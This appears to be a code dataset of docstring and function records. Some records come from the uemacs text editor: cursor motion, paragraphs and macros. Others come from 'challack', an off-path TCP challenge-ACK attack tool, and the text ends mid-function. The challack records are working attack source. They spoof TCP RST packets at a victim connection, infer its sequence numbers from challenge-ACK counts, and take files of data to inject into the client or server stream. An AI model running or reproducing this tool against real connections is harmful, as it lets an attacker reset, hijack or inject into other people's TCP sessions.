{"docstring": "/*\n * Quit command. If an argument, always quit. Otherwise confirm if a buffer\n * has been changed and not written out. Normally bound to \"C-X C-C\".\n */\n", "func_signal": "int quit(int f, int n)", "code": "{\n\tint s;\n\n\tif (f != FALSE\t\t/* Argument forces it.  */\n\t    || anycb() == FALSE\t/* All buffers clean.   */\n\t    /* User says it's OK.   */\n\t    || (s =\n\t\tmlyesno(\"Modified buffers exist. Leave anyway\")) == TRUE) {\n#if\t(FILOCK && BSD) || SVR4\n\t\tif (lockrel() != TRUE) {\n\t\t\tTTputc('\\n');\n\t\t\tTTputc('\\r');\n\t\t\tTTclose();\n\t\t\tTTkclose();\n\t\t\texit(1);\n\t\t}\n#endif\n\t\tvttidy();\n\t\tif (f)\n\t\t\texit(n);\n\t\telse\n\t\t\texit(GOOD);\n\t}\n\tmlwrite(\"\");\n\treturn s;\n}", "path": "main.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * go back to the beginning of the current paragraph\n * here we look for a <NL><NL> or <NL><TAB> or <NL><SPACE>\n * combination to delimit the beginning of a paragraph\n *\n * int f, n;\t\tdefault Flag & Numeric argument\n */\n", "func_signal": "int gotobop(int f, int n)", "code": "{\n\tint suc;  /* success of last backchar */\n\n\tif (n < 0) /* the other way... */\n\t\treturn gotoeop(f, -n);\n\n\twhile (n-- > 0) {  /* for each one asked for */\n\n\t\t/* first scan back until we are in a word */\n\t\tsuc = backchar(FALSE, 1);\n\t\twhile (!inword() && suc)\n\t\t\tsuc = backchar(FALSE, 1);\n\t\tcurwp->w_doto = 0;\t/* and go to the B-O-Line */\n\n\t\t/* and scan back until we hit a <NL><NL> or <NL><TAB>\n\t\t   or a <NL><SPACE>                                     */\n\t\twhile (lback(curwp->w_dotp) != curbp->b_linep)\n\t\t\tif (llength(curwp->w_dotp) != 0 &&\n#if\tPKCODE\n\t\t\t    ((justflag == TRUE) ||\n#endif\n\t\t\t     (lgetc(curwp->w_dotp, curwp->w_doto) != TAB &&\n\t\t\t      lgetc(curwp->w_dotp, curwp->w_doto) != ' '))\n#if\tPKCODE\n\t\t\t    )\n#endif\n\t\t\t\tcurwp->w_dotp = lback(curwp->w_dotp);\n\t\t\telse\n\t\t\t\tbreak;\n\n\t\t/* and then forward until we are in a word */\n\t\tsuc = forwchar(FALSE, 1);\n\t\twhile (suc && !inword())\n\t\t\tsuc = forwchar(FALSE, 1);\n\t}\n\tcurwp->w_flag |= WFMOVE;\t/* force screen update */\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Begin a keyboard macro.\n * Error if not at the top level in keyboard processing. Set up variables and\n * return.\n */\n", "func_signal": "int ctlxlp(int f, int n)", "code": "{\n\tif (kbdmode != STOP) {\n\t\tmlwrite(\"%%Macro already active\");\n\t\treturn FALSE;\n\t}\n\tmlwrite(\"(Start macro)\");\n\tkbdptr = &kbdm[0];\n\tkbdend = kbdptr;\n\tkbdmode = RECORD;\n\treturn TRUE;\n}", "path": "main.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * End keyboard macro. Check for the same limit conditions as the above\n * routine. Set up the variables and return to the caller.\n */\n", "func_signal": "int ctlxrp(int f, int n)", "code": "{\n\tif (kbdmode == STOP) {\n\t\tmlwrite(\"%%Macro not active\");\n\t\treturn FALSE;\n\t}\n\tif (kbdmode == RECORD) {\n\t\tmlwrite(\"(End macro)\");\n\t\tkbdmode = STOP;\n\t}\n\treturn TRUE;\n}", "path": "main.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/* Set the current background color.\n * color: color to set.\n */\n", "func_signal": "void ansibcol(int color)", "code": "{\n\tif (color == cbcolor)\n\t\treturn;\n\tttputc(ESC);\n\tttputc('[');\n\tansiparm(color + 40);\n\tttputc('m');\n\tcbcolor = color;\n}", "path": "ansi.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Move to a particular line.\n *\n * @n: The specified line position at the current buffer.\n */\n", "func_signal": "int gotoline(int f, int n)", "code": "{\n\tint status;\n\tchar arg[NSTRING]; /* Buffer to hold argument. */\n\n\t/* Get an argument if one doesnt exist. */\n\tif (f == FALSE) {\n\t\tif ((status =\n\t\t     mlreply(\"Line to GOTO: \", arg, NSTRING)) != TRUE) {\n\t\t\tmlwrite(\"(Aborted)\");\n\t\t\treturn status;\n\t\t}\n\t\tn = atoi(arg);\n\t}\n        /* Handle the case where the user may be passed something like this:\n         * em filename +\n         * In this case we just go to the end of the buffer.\n         */\n\tif (n == 0)\n\t\treturn gotoeob(f, n);\n\n\t/* If a bogus argument was passed, then returns false. */\n\tif (n < 0)\n\t\treturn FALSE;\n\n\t/* First, we go to the begin of the buffer. */\n\tgotobob(f, n);\n\treturn forwline(f, n - 1);\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * This function is like \"forwline\", but goes backwards. The scheme is exactly\n * the same. Check for arguments that are less than zero and call your\n * alternate. Figure out the new line and call \"movedot\" to perform the\n * motion. No errors are possible. Bound to \"C-P\".\n */\n", "func_signal": "int backline(int f, int n)", "code": "{\n\tstruct line *dlp;\n\n\tif (n < 0)\n\t\treturn forwline(f, -n);\n\n\t/* if we are on the last line as we start....fail the command */\n\tif (lback(curwp->w_dotp) == curbp->b_linep)\n\t\treturn FALSE;\n\n\t/* if the last command was not note a line move,\n\t   reset the goal column */\n\tif ((lastflag & CFCPCN) == 0)\n\t\tcurgoal = getccol(FALSE);\n\n\t/* flag this command as a line move */\n\tthisflag |= CFCPCN;\n\n\t/* and move the point up */\n\tdlp = curwp->w_dotp;\n\twhile (n-- && lback(dlp) != curbp->b_linep)\n\t\tdlp = lback(dlp);\n\n\t/* reseting the current position */\n\tcurwp->w_dotp = dlp;\n\tcurwp->w_doto = getgoal(dlp);\n\tcurwp->w_flag |= WFMOVE;\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Move the cursor forwards by \"n\" characters. If \"n\" is less than zero call\n * \"backchar\" to actually do the move. Otherwise compute the new cursor\n * location, and move \".\". Error if you try and move off the end of the\n * buffer. Set the flag if the line pointer for dot changes.\n */\n", "func_signal": "int forwchar(int f, int n)", "code": "{\n\tif (n < 0)\n\t\treturn backchar(f, -n);\n\twhile (n--) {\n\t\tint len = llength(curwp->w_dotp);\n\t\tif (curwp->w_doto == len) {\n\t\t\tif (curwp->w_dotp == curbp->b_linep)\n\t\t\t\treturn FALSE;\n\t\t\tcurwp->w_dotp = lforw(curwp->w_dotp);\n\t\t\tcurwp->w_doto = 0;\n\t\t\tcurwp->w_flag |= WFMOVE;\n\t\t} else {\n\t\t\tdo {\n\t\t\t\tunsigned char c;\n\t\t\t\tcurwp->w_doto++;\n\t\t\t\tc = lgetc(curwp->w_dotp, curwp->w_doto);\n\t\t\t\tif (is_beginning_utf8(c))\n\t\t\t\t\tbreak;\n\t\t\t} while (curwp->w_doto < len);\n\t\t}\n\t}\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/* Move howmany lines starting at from to to. */\n", "func_signal": "void ibmscroll_reg(from, to, howmany)", "code": "{\n\tint i;\n\n\tif (to < from) {\n\t\tfor (i = 0; i < howmany; i++) {\n\t\t\tmovmem(scptr[from + i], scptr[to + i],\n\t\t\t       term.t_ncol * 2);\n\t\t}\n\t}\n\telse if (to > from) {\n\t\tfor (i = howmany - 1; i >= 0; i--) {\n\t\t\tmovmem(scptr[from + i], scptr[to + i],\n\t\t\t       term.t_ncol * 2);\n\t\t}\n\t}\n}", "path": "ibmpc.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * This routine, given a pointer to a struct line, and the current cursor goal\n * column, return the best choice for the offset. The offset is returned.\n * Used by \"C-N\" and \"C-P\".\n */\n", "func_signal": "static int getgoal(struct line *dlp)", "code": "{\n\tint col;\n\tint newcol;\n\tint dbo;\n\tint len = llength(dlp);\n\n\tcol = 0;\n\tdbo = 0;\n\twhile (dbo != len) {\n\t\tunicode_t c;\n\t\tint width = utf8_to_unicode(dlp->l_text, dbo, len, &c);\n\t\tnewcol = col;\n\n\t\t/* Take tabs, ^X and \\xx hex characters into account */\n\t\tif (c == '\\t')\n\t\t\tnewcol |= tabmask;\n\t\telse if (c < 0x20 || c == 0x7F)\n\t\t\t++newcol;\n\t\telse if (c >= 0x80 && c <= 0xa0)\n\t\t\tnewcol += 2;\n\n\t\t++newcol;\n\t\tif (newcol > curgoal)\n\t\t\tbreak;\n\t\tcol = newcol;\n\t\tdbo += width;\n\t}\n\treturn dbo;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Go forword to the end of the current paragraph\n * here we look for a <NL><NL> or <NL><TAB> or <NL><SPACE>\n * combination to delimit the beginning of a paragraph\n *\n * int f, n;\t\tdefault Flag & Numeric argument\n */\n", "func_signal": "int gotoeop(int f, int n)", "code": "{\n\tint suc;  /* success of last backchar */\n\n\tif (n < 0)  /* the other way... */\n\t\treturn gotobop(f, -n);\n\n\twhile (n-- > 0) {  /* for each one asked for */\n\t\t/* first scan forward until we are in a word */\n\t\tsuc = forwchar(FALSE, 1);\n\t\twhile (!inword() && suc)\n\t\t\tsuc = forwchar(FALSE, 1);\n\t\tcurwp->w_doto = 0;\t/* and go to the B-O-Line */\n\t\tif (suc)\t/* of next line if not at EOF */\n\t\t\tcurwp->w_dotp = lforw(curwp->w_dotp);\n\n\t\t/* and scan forword until we hit a <NL><NL> or <NL><TAB>\n\t\t   or a <NL><SPACE>                                     */\n\t\twhile (curwp->w_dotp != curbp->b_linep) {\n\t\t\tif (llength(curwp->w_dotp) != 0 &&\n#if\tPKCODE\n\t\t\t    ((justflag == TRUE) ||\n#endif\n\t\t\t     (lgetc(curwp->w_dotp, curwp->w_doto) != TAB &&\n\t\t\t      lgetc(curwp->w_dotp, curwp->w_doto) != ' '))\n#if\tPKCODE\n\t\t\t    )\n#endif\n\t\t\t\tcurwp->w_dotp = lforw(curwp->w_dotp);\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\n\t\t/* and then backward until we are in a word */\n\t\tsuc = backchar(FALSE, 1);\n\t\twhile (suc && !inword()) {\n\t\t\tsuc = backchar(FALSE, 1);\n\t\t}\n\t\tcurwp->w_doto = llength(curwp->w_dotp);\t/* and to the EOL */\n\t}\n\tcurwp->w_flag |= WFMOVE;  /* force screen update */\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Goto the beginning of the buffer. Massive adjustment of dot. This is\n * considered to be hard motion; it really isn't if the original value of dot\n * is the same as the new value of dot. Normally bound to \"M-<\".\n */\n", "func_signal": "int gotobob(int f, int n)", "code": "{\n\tcurwp->w_dotp = lforw(curbp->b_linep);\n\tcurwp->w_doto = 0;\n\tcurwp->w_flag |= WFHARD;\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Move the cursor to the end of the current line. Trivial. No errors.\n */\n", "func_signal": "int gotoeol(int f, int n)", "code": "{\n\tcurwp->w_doto = llength(curwp->w_dotp);\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * build a test schedule based on the start and end of a range (reverse order)\n */\n", "func_signal": "chunk_t *build_schedule_reverse(u_long start, u_long end, u_long chunk_sz, int *pnchunks)", "code": "{\n\tint i, nchunks;\n\tu_long num;\n\tchunk_t *schedule = NULL;\n\n\tnum = end - start;\n\tif (num <= chunk_sz) {\n\t\tfprintf(stderr, \"[!] build_schedule_reverse: invalid range (too small)!\\n\");\n\t\treturn NULL;\n\t}\n\tnchunks = (num / chunk_sz) + 1;\n\n\tschedule = (chunk_t *)malloc(sizeof(chunk_t) * nchunks);\n\tif (!schedule) {\n\t\tperror(\"[!] malloc\");\n\t\treturn NULL;\n\t}\n\n\t/* fill the schedule starting from the end */\n\tfor (i = 0; i < nchunks; i++) {\n\t\tif ((u_long)((i + 1) * chunk_sz) > end)\n\t\t\tschedule[i].start = start;\n\t\telse\n\t\t\tschedule[i].start = end - ((i + 1) * chunk_sz);\n\t\tschedule[i].end = end - (i * chunk_sz);\n\t}\n\n\t*pnchunks = nchunks;\n\treturn schedule;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * stage 3 - sequence number inference\n *\n * try to determine the victim's current sequence number\n *\n * this stage has 3 steps:\n *\n * 1. determine a block of windows containing the sequence number - step:0\n *    we do this using an optimized approach breaking the search space\n *    into blocks based on the window size.\n * 2. figure out which of the bins precisely the sequence number is in - step:1\n *    we use a binary search for this.\n * 3. figure out the exact sequence number - step:2,3\n *    we used a hybrid (chunk and binary) search for this step.\n */\n", "func_signal": "int infer_sequence_step1(u_long *pstart, u_long *pend)", "code": "{\n\tstruct timeval infer_start, round_start, now, diff;\n\tvolatile conn_t *spoof = &(g_ctx.spoof);\n\t/* printing status */\n\tu_long pr_start, pr_end, pkts_sent;\n\t/* chunk-based search vars */\n\tchunk_t *sched = NULL;\n\tint nchunks = 0, ci = 0;\n\n\tgettimeofday(&infer_start, NULL);\n\n\t/* allocate a schedule for testing sequence blocks\n\t * NOTE: the values in the schedule are actually block numbers\n\t */\n\tsched = build_schedule(*pstart / g_ctx.winsz, *pend / g_ctx.winsz,\n\t\t\tg_ctx.packets_per_second, &nchunks);\n\tif (!sched)\n\t\treturn 0;\n\n\t/* further stages will launch as things progress */\n\twhile (1) {\n\t\tu_long seq_block;\n\t\tgettimeofday(&round_start, NULL);\n\n\t\t/* set these for printing status */\n\t\tpr_start = sched[ci].start * g_ctx.winsz;\n\t\tpr_end = sched[ci].end * g_ctx.winsz;\n\n\t\t/* send em! */\n\t\tpkts_sent = 0;\n\t\t// XXX: TODO: implement optmization for < 14 ports to probe...\n\t\tfor (seq_block = sched[ci].start; seq_block < sched[ci].end; seq_block++) {\n\t\t\tspoof->seq = seq_block * g_ctx.winsz;\n\t\t\tif (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0)) {\n\t\t\t\tfree(sched);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tusleep(g_ctx.packet_delay);\n\t\t\tpkts_sent++;\n\t\t}\n\t\t/* we'll do maintenance after we check the results */\n\n#ifdef DEBUG_SEQ_INFER_SPOOF_SEND\n\t\tgettimeofday(&now, NULL);\n\t\ttimersub(&now, &round_start, &diff);\n\t\tprintf(\"[*] seq-infer: spoofed %lu RSTs in %lu %lu\\n\", pkts_sent,\n\t\t\t\tdiff.tv_sec, diff.tv_usec);\n#endif\n\n\t\t/* send 100 RSTs */\n\t\tif (!send_packets_delay(&g_rst_pkt, 100, 1000)) {\n\t\t\tfree(sched);\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* get the number of challenge ACKs within this second */\n\t\twait_until(\"seq-infer recv\", &round_start, 1, 0);\n\n\t\tprintf(\"[*] seq-infer (1): guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\\n\",\n\t\t\t\tpr_start, pr_end, pkts_sent, g_chack_cnt);\n\n\t\t/* adjust the search based on the results and mode */\n\t\tif (g_chack_cnt == 100) {\n\t\t\tci++;\n\t\t\tif (ci == nchunks) {\n\t\t\t\tprintf(\"[!] Exhausted seq window search...\\n\");\n\t\t\t\tfree(sched);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t} else if (g_chack_cnt < 100) {\n\t\t\t*pstart = pr_start;\n\t\t\t*pend = pr_end + g_ctx.winsz;\n\n\t\t\tgettimeofday(&now, NULL);\n\t\t\ttimersub(&now, &infer_start, &diff);\n\t\t\tprintf(\"[*] Narrowed sequence (1) to %lu - %lu, %lu possibilities (after %lu %lu)\\n\",\n\t\t\t\t\t*pstart, *pend, *pend - *pstart, diff.tv_sec,\n\t\t\t\t\tdiff.tv_usec);\n\n\t\t\t/* adjust winsz if g_chack_cnt < 99 */\n\t\t\tif (g_chack_cnt < 99) {\n\t\t\t\tg_ctx.winsz *= 2;\n\t\t\t\tprintf(\"[*] NOTE: Window size too conservative, doubling to %d...\\n\", g_ctx.winsz);\n\t\t\t}\n\n\t\t\t/* reset the schedule */\n\t\t\tg_chack_cnt = 0;\n\t\t\tfree(sched);\n\t\t\treturn 1;\n\t\t} else {\n\t\t\tfprintf(stderr, \"[!] invalid challenge ACK count! retrying range...\\n\");\n\t\t}\n\n\t\tg_chack_cnt = 0;\n\t}\n\n\t/* should not be reached */\n\tfree(sched);\n\treturn 0;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * The main function of this program simply checks prelimary arguments and\n * and launches the attack.\n */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tchar *argv0;\n\tint ret = 0, c, srvport, altport = -1, cliport = -1;\n\tchar myhost[512];\n\tstruct sockaddr_in sin;\n\tchar *srvfn = NULL, *clifn = NULL;\n\tint client_mode = -1;\n\tchar sport[32], dport[32];\n\n\t/* look up this machine's address */\n\tif (gethostname(myhost, sizeof(myhost)) == -1) {\n\t\tperror(\"[!] gethostname\");\n\t\treturn 1;\n\t}\n\tif (!lookup_host(myhost, &sin))\n\t\treturn 1;\n\tg_ctx.legit.src = sin;\n\n\t/* initalize stuff */\n\tsrand(getpid());\n\tg_ctx.packets_per_second = PACKETS_PER_SECOND;\n\tg_ctx.packet_delay = PACKET_DELAY;\n\n\targv0 = \"challack\";\n\tif (argv && argc > 0 && argv[0])\n\t\targv0 = argv[0];\n\n\tif (argc < 4) {\n\t\tusage(argv0);\n\t\treturn 1;\n\t}\n\n\twhile ((c = getopt(argc, argv, \"a:c:d:ghI:i:P:p:r:S:s:A:w:\")) != -1) {\n\t\tswitch (c) {\n\t\t\tcase '?':\n\t\t\tcase 'h':\n\t\t\t\tusage(argv0);\n\t\t\t\treturn 1;\n\n\t\t\tcase 'g':\n\t\t\t\tg_ctx.autostart = 1;\n\t\t\t\tbreak;\n\n\t\t\tcase 'c':\n\t\t\t\tif ((client_mode = validate_port(optarg)) == -1)\n\t\t\t\t\treturn 1;\n\t\t\t\tbreak;\n\n\t\t\tcase 'd':\n\t\t\t\t{\n\t\t\t\t\tchar *pend = NULL;\n\t\t\t\t\tu_long tmp = strtoul(optarg, &pend, 0);\n\n\t\t\t\t\tif (!pend || *pend || tmp >= 1000000) {\n\t\t\t\t\t\tfprintf(stderr, \"[!] invalid delay: %s\\n\", optarg);\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\tg_ctx.packet_delay = tmp;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'I':\n\t\t\t\t{\n\t\t\t\t\toff_t len;\n\t\t\t\t\tchar *buf = slurp(optarg, &len);\n\n\t\t\t\t\tif (!buf) {\n\t\t\t\t\t\tfprintf(stderr, \"[!] unable to load client inject data from \\\"%s\\\"\\n\", optarg);\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\tg_ctx.inject_client = buf;\n\t\t\t\t\tg_ctx.inject_client_len = len;\n\t\t\t\t\tclifn = optarg;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'i':\n\t\t\t\t{\n\t\t\t\t\toff_t len;\n\t\t\t\t\tchar *buf = slurp(optarg, &len);\n\n\t\t\t\t\tif (!buf) {\n\t\t\t\t\t\tfprintf(stderr, \"[!] unable to load server inject data from \\\"%s\\\"\\n\", optarg);\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\tg_ctx.inject_server = buf;\n\t\t\t\t\tg_ctx.inject_server_len = len;\n\t\t\t\t\tsrvfn = optarg;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'p':\n\t\t\t\tif ((cliport = validate_port(optarg)) == -1)\n\t\t\t\t\treturn 1;\n\t\t\t\tbreak;\n\n\t\t\tcase 'P':\n\t\t\t\tif ((altport = validate_port(optarg)) == -1)\n\t\t\t\t\treturn 1;\n\t\t\t\tbreak;\n\n\t\t\tcase 'r':\n\t\t\t\t{\n\t\t\t\t\tchar *pend = NULL;\n\t\t\t\t\tu_long tmp = strtoul(optarg, &pend, 0);\n\n\t\t\t\t\tif (!pend || *pend || tmp > 1000000) {\n\t\t\t\t\t\tfprintf(stderr, \"[!] invalid packet rate: %s\\n\", optarg);\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\tg_ctx.packets_per_second = tmp;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'S':\n\t\t\t\t{\n\t\t\t\t\tuint32_t tmp;\n\n\t\t\t\t\tif (validate_seqack(optarg, 0, &tmp, NULL) == -1)\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\tg_ctx.spoof.seq = tmp;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 's':\n\t\t\t\t{\n\t\t\t\t\tuint32_t start, end = 0;\n\n\t\t\t\t\tif (validate_seqack(optarg, 1, &start, &end) == -1)\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\tg_ctx.start_seq = start;\n\t\t\t\t\tg_ctx.end_seq = end;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'w':\n\t\t\t\t{\n\t\t\t\t\tint winsz = atoi(optarg);\n\n\t\t\t\t\tif (winsz < 1 || winsz > 65535) {\n\t\t\t\t\t\tfprintf(stderr, \"[!] %s is not a valid window size.\\n\", optarg);\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\tg_ctx.winsz = winsz;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'A':\n\t\t\t\t{\n\t\t\t\t\tuint32_t tmp;\n\n\t\t\t\t\tif (validate_seqack(optarg, 0, &tmp, NULL) == -1)\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\tg_ctx.spoof.ack = tmp;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase 'a':\n\t\t\t\t{\n\t\t\t\t\tuint32_t start, end = 0;\n\n\t\t\t\t\tif (validate_seqack(optarg, 1, &start, &end) == -1)\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\tg_ctx.start_ack = start;\n\t\t\t\t\tg_ctx.end_ack = end;\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tdefault:\n\t\t\t\tfprintf(stderr, \"[!] invalid option '%c'! try -h ...\\n\", c);\n\t\t\t\treturn 1;\n\t\t\t\t/* not reached */\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\t/* adjust params */\n\targc -= optind;\n\targv += optind;\n\n\t/* process required arguments */\n\tif (argc < 3) {\n\t\tusage(argv0);\n\t\treturn 1;\n\t}\n\n\t/* see if we can get the target server address */\n\tmemset(&sin, 0, sizeof(sin));\n\tif (!lookup_host(argv[0], &sin))\n\t\treturn 1;\n\tg_ctx.legit.dst = sin;\n\tg_ctx.spoof.dst = sin;\n\n\t/* see if we can get the client's address */\n\tif (!lookup_host(argv[2], &sin))\n\t\treturn 1;\n\tg_ctx.spoof.src = sin;\n\n\t/* validate and record the server port */\n\tif ((srvport = validate_port(argv[1])) == -1)\n\t\treturn 1;\n\tg_ctx.legit.dst.sin_port = htons((uint16_t)srvport);\n\tif (client_mode == -1)\n\t\tg_ctx.spoof.dst.sin_port = htons((uint16_t)srvport);\n\n\t/* for client mode, we need to spoof packets from the specified port on the\n\t * server to the client */\n\tstrcpy(sport, \"TBD\");\n\tstrcpy(dport, \"TBD\");\n\tif (client_mode != -1) {\n\t\tg_ctx.spoof.src.sin_port = htons(client_mode);\n\t\tsprintf(sport, \"%u (from -c)\", client_mode);\n\n\t\tif (cliport != -1) {\n\t\t\tg_ctx.spoof.dst.sin_port = htons(cliport);\n\t\t\tsprintf(dport, \"%u (from -p)\", cliport);\n\t\t}\n\t\tg_ctx.client_mode = 1;\n\t} else {\n\t\tif (cliport != -1) {\n\t\t\tg_ctx.spoof.src.sin_port = htons(cliport);\n\t\t\tsprintf(sport, \"%u (from -p)\", cliport);\n\t\t}\n\n\t\tif (altport != -1) {\n\t\t\tg_ctx.spoof.dst.sin_port = htons(altport);\n\t\t\tsprintf(dport, \"%u (from -P)\", altport);\n\t\t} else {\n\t\t\tsprintf(dport, \"%u\", ntohs(g_ctx.spoof.dst.sin_port));\n\t\t}\n\t}\n\n\t/* show details of the attack before commencing */\n\tprintf(\"[*] Launching off-path challenge ACK attack against the connection between:\\n\");\n\tprintf(\"    source: %s:%s\\n\", inet_ntoa(g_ctx.spoof.src.sin_addr), sport);\n\tprintf(\"    destination: %s:%s\\n\", inet_ntoa(g_ctx.spoof.dst.sin_addr), dport);\n\tprintf(\"[*] Sending legit challenge ACKs to: %s:%u\\n\",\n\t\t\tinet_ntoa(g_ctx.legit.dst.sin_addr),\n\t\t\tntohs(g_ctx.legit.dst.sin_port));\n\tprintf(\"    from: %s\\n\", inet_ntoa(g_ctx.legit.src.sin_addr));\n\tif (g_ctx.spoof.seq)\n\t\tprintf(\"    spoofed sequence: %lu (0x%lx)\\n\", (u_long)g_ctx.spoof.seq,\n\t\t\t\t(u_long)g_ctx.spoof.seq);\n\tif (g_ctx.spoof.ack)\n\t\tprintf(\"    spoofed ack: %lu (0x%lx)\\n\", (u_long)g_ctx.spoof.ack,\n\t\t\t\t(u_long)g_ctx.spoof.ack);\n\tif (g_ctx.start_seq)\n\t\tprintf(\"    starting with sequence: %lu (0x%lx)\\n\",\n\t\t\t\t(u_long)g_ctx.start_seq, (u_long)g_ctx.start_seq);\n\tif (g_ctx.end_seq)\n\t\tprintf(\"    ending with sequence: %lu (0x%lx)\\n\",\n\t\t\t\t(u_long)g_ctx.end_seq, (u_long)g_ctx.end_seq);\n\tif (g_ctx.start_ack)\n\t\tprintf(\"    starting with ack: %lu (0x%lx)\\n\",\n\t\t\t\t(u_long)g_ctx.start_ack, (u_long)g_ctx.start_ack);\n\tif (g_ctx.end_ack)\n\t\tprintf(\"    ending with ack: %lu (0x%lx)\\n\",\n\t\t\t\t(u_long)g_ctx.end_ack, (u_long)g_ctx.end_ack);\n\tif (g_ctx.packets_per_second != PACKETS_PER_SECOND)\n\t\tprintf(\"    packets per second: %lu\\n\", g_ctx.packets_per_second);\n\tif (g_ctx.packet_delay != PACKET_DELAY)\n\t\tprintf(\"    packet delay: %lu\\n\", g_ctx.packet_delay);\n\tif (srvfn)\n\t\tprintf(\"    attempting to inject %lu bytes to the server from \\\"%s\\\"\\n\",\n\t\t\t\tg_ctx.inject_server_len, srvfn);\n\tif (clifn)\n\t\tprintf(\"    attempting to inject %lu bytes to the client from \\\"%s\\\"\\n\",\n\t\t\t\tg_ctx.inject_client_len, clifn);\n\tif (g_ctx.winsz)\n\t\tprintf(\"    tcp window size: %u\\n\", g_ctx.winsz);\n\n\t/* here we go.. WOOO */\n\tret = set_up_attack();\n\n\tif (!unblock_traffic())\n\t\treturn 1;\n\n\treturn ret;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * this function sets up the attack.\n *\n * it starts by opening a raw socket and starting to capture packets for the\n * legit connection.\n *\n * next, we execute a three-way handshake to get connected.\n *\n * finally, we loop for packets that we captured and do maintenance on the TCP\n * session as needed.\n *\n * special keys while in the data loop:\n * control-U         erase to beginning of line\n * control-[ (Esc)   closes connection and exits\n * \"start\\n\"         launches the offpath attack (after connected)\n */\n", "func_signal": "int set_up_attack(void)", "code": "{\n\tuint16_t lport = rand() & 0xffff;\n\tpcap_t *pch = NULL;\n\tstruct pcap_pkthdr *pchdr = NULL;\n\tconst u_char *inbuf = NULL;\n\tint pcret;\n\tchar outbuf[8192];\n\tint outlen = 0;\n\tvolatile conn_t *pconn;\n\tint ipoff;\n\n\tprintf(\"[*] Selected local port: %u\\n\", lport);\n\n\tpconn = &g_ctx.legit;\n\tif (!start_pcap(&pch, &(pconn->dst), lport, &ipoff)) {\n\t\tpcap_perror(pch, \"[!] Unable to start packet capture\");\n\t\treturn 1;\n\t}\n\tg_ctx.pch = pch;\n\tg_ctx.ipoff = ipoff;\n\n\t/* if we have both a seq and a client port, just send a packet */\n\tif (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {\n\t\tif (g_ctx.spoof.ack) {\n\t\t\tif (!inject_the_data())\n\t\t\t\treturn 0;\n\t\t} else {\n\t\t\tif (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))\n\t\t\t\treturn 0;\n\t\t}\n\t\t/* exit the program here */\n\t\treturn 0;\n\t}\n\n\t/* drop packets from the legit host so the kernel won't respond on our\n\t * behalf */\n\tif (!block_traffic())\n\t\treturn 0;\n\n\t/* set the local port */\n\tpconn->src.sin_port = htons(lport);\n\n\t/* initialize the parts of the spoofed connection we know.. */\n\ttcp_init(&g_ctx.spoof, 0);\n\n\t/* make a legit connection to the server */\n\ttcp_init(pconn, rand());\n\tif (!tcp_send(pch, pconn, TH_SYN, NULL, 0))\n\t\treturn 1;\n\tpconn->state = 